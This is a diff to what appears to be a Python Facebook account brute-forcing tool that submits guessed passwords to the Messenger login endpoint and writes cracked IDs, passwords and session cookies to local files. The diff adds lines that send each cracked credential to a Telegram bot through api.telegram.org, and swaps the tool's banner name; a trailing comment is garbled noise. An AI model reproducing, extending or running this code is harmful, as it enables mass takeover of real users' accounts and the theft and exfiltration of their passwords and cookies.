@@ -1851,11 +1851,11 @@ def dump_massal():
         print(X+'Done')
         print(f' ➪ 𝚒𝚍𝚜 : {h}'+str(len(id)))
         
-        setting()
+        exit()
     except requests.exceptions.ConnectionError:
         print(f'{G}')
         print('>> error')
-        back()
+        exit()
     except (KeyError,IOError):
         print(f'>>{k} error {x}')
         exit()
@@ -2015,7 +2015,7 @@ def checker(idf, pwv, index):
 			response  = r.post('https://www.messenger.com/login/password/', data=signature, headers=headers)
 		
 			print(
-				'\r\033[2;36mϟ \033[1;97m[\033[2;36mRayen\033[1;97m-\033[2;36mGamoudi\033[2;32m] \033[1;97m~ '
+				'\r\033[2;36mϟ \033[1;97m[\033[2;36m𝚁𝚎𝚊𝚕𝚒𝚝𝚢\033[1;97m-\033[2;36m𝚟𝚒𝚕𝚕𝚊𝚒𝚗𝚜\033[2;32m] \033[1;97m~ '
 				f'\033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m{ok}\033[1;97m '
 				f'-\033[1;31m {cp}\033[1;97m] = [\033[1;33m {total}/{len(fid)}\033[1;97m ]', end=' '
 			)
@@ -2024,14 +2024,18 @@ def checker(idf, pwv, index):
 				cp+=1
 				print(f'\r\033[1;91m└──[✵>𝚁𝚎𝚊𝚕𝚒𝚝𝚢 𝚟𝚒𝚕𝚕𝚊𝚒𝚗𝚜-𝐂𝐏] {idf} | {ps}	  \n♻️تاريخ إنشاء الحساب -└──>  :{tahun(idf)}\n')
 				os.system('espeak -a 300 "  Cp,  Id  "')
-				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-CP.txt','a').write(idf+'|'+ps+'|'+tahun(idf)+'\n')
+				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-CP.txt','a').write(idf+'|'+ps+'\n|'+tahun(idf)+'\n')
+				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ CP- : '+idf+' ׀ '+ps+' | '+tahun(idf)))
+				
 			elif 'c_user' in r.cookies.get_dict():
 				ok+=1
 				coki=r.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
 				print(f'\r\033[1;92m└──[✵>𝚁𝚎𝚊𝚕𝚒𝚝𝚢 𝚟𝚒𝚕𝚕𝚊𝚒𝚗𝚜-𝐎𝐊]  🆔 :|	 {idf}	   🔑 :|	 {ps} \n \n\033[0;96m[🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──> \033[38;5;48m{kuki} \n♻️تاريخ إنشاء الحساب -└──>  :{tahun(idf)}\n')
-				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-OK.txt','a').write(idf+'|'+ps+'|'+kuki+'|'+tahun(idf)+'\n\n')
+				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-OK.txt','a').write(idf+'|'+ps+'|'+kuki+'\n|'+tahun(idf)+'\n\n')
 				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-rOK.txt','a').write(idf+'|'+ps+'\n')
+				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ OK- : '+idf+' ׀ '+ps+'\n|'+tahun(idf)))
+				
 			else:
 				continue
 		except Exception:
@@ -2688,4 +2692,4 @@ if __name__ == "__main__":
     brute = Brute()  # كائن من الفئة Brute
     Menu()           # عرض القاjئnnمjjة أو nتنفيذ الخياراتgh
     
-    #bhgوتyyyتتتتناتتjjhmnhhhyاتتاااbنh,😙=u\|ت𝚑𝚑😋gbتتتااhj𝐡𝐡
+    #bhgوتyyyتتتتناتتjjhmnhhhyاتتاااbنh,😙=uvvv\|ت𝚑𝚑😋gbتتتااhj𝐡𝐡
